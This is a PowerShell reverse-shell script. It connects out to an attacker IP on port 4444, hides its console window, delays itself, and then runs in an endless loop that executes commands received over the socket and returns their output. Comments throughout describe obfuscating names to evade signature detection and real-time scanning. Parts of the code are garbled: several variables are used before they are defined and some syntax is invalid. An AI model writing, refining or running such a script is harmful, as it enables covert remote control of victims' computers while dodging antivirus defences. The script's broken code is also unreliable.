# Obfuscated variables and commands to evade simple signature detection
$I = [Char]73; $P = [Char]80; $t = [Char]116; $c = [Char]99; $l = [Char]108; $i = [Char]105; $e = [Char]101; $n = [Char]110; $t = [Char]116
$attack_$i = "192.168.1.100"  # Replace with attacker's IP (obfuscated variable name)
$p_o_r_t = 4444               # Port number

# Create TCP client with encoded class name
$tc = New-Object ("System.Net.Sockets.T" + $c + $p + $l + $i + $e + $n + $t)($attack_$i, $p_o_r_t)
$s_t_r_e_a_m = $tc.GetStream()
$w_r_i_t_e_r = New-Object ("System.IO.Str" + $e + $a + $m + $W + $r + $i + $t + $e + $r)($s_t_r_e_a_m)
$w_r_i_t_e_r.AutoFlush = $true
$b_u_f_f_e_r = New-Object ("System.Byte[]") 1024
$e_n_c_o_d_i_n_g = New-Object ("System.Text.A" + $s + $c + $i + $i + $E + $n + $c + $o + $d + $i + $n + $g)

# Hide console window using P/Invoke (obfuscated)
$A = [Char]65; $d = [Char]100; $T = [Char]84; $y = [Char]121; $p = [Char]112; $e = [Char]101
Add-Type @"
using $S{$y$stem};
using $S{$y$stem}.Runtime.InteropServices;
public class $W{$i$n$d$o$w} {
    [DllImport("kernel32.dll")]
    public static extern Int$P{tr} Get$C{onsole}$W{indow}();
    [DllImport("user32.dll")]
    public static extern bool $S{h}ow$W{indow}(Int$P{tr} h$W{n}d, int n$C{m}d$S{h}ow);
}
"@
$c_o_n_s_o_l_e = [$W{$i$n$d$o$w}]::Get$C{onsole}$W{indow}()
[$W{$i$n$d$o$w}]::$S{h}ow$W{indow}($c_o_n_s_o_l_e, 0)  # Hide window (0 = SW_HIDE)

# Runtime delay to evade real-time scanning
Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)

# Main loop with obfuscated logic
while ($true) {
    if ($s_t_r_e_a_m.DataAvailable) {
        $r_e_a_d = $s_t_r_e_a_m.Read($b_u_f_f_e_r, 0, $b_u_f_f_e_r.Length)
        $c_m_d = $e_n_c_o_d_i_n_g.GetString($b_u_f_f_e_r, 0, $r_e_a_d)
        $o_u_t_p_u_t = try {
            & ([ScriptBlock]::Create($c_m_d)) 2>&1 | Out-String
        } catch {
            "Error: $_" | Out-String
        }
        $w_r_i_t_e_r.WriteLine($o_u_t_p_u_t)
    }
    Start-Sleep -Milliseconds 100
}

# Cleanup (won't run due to infinite loop)
$w_r_i_t_e_r.Close()
$s_t_r_e_a_m.Close()
$tc.Close()
